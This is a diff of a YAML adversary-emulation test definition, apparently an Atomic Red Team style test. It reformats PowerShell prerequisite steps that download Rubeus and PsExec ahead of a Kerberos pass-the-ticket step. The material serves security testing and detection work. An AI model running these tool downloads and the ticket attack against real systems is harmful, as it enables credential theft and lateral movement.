@@ -36,17 +36,21 @@ steps:
     - name: |
         Rubeus must exist on disk at "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"
       inline: |
-        if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe") {exit 0} else { {New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-        Invoke-Webrequest -Uri #{rubeus_url} -OutFile "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"
+        if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe") {exit 0} else { {
+        New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-Webrequest -Uri {{.Args.rubeus_url}} -OutFile "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"
+
         } }
       executor: powershell
     - name: |
         PsExec must exist on disk at "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"
       inline: |
-        if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe") {exit 0} else { {Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"
+        if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe") {exit 0} else { {
+        Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"
         Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools" -Force
         New-Item -ItemType Directory (Split-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe") -Force | Out-Null
         Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -Force
+
         } }
       executor: powershell
     - name: rubeus-kerberos-pass-the-ticket
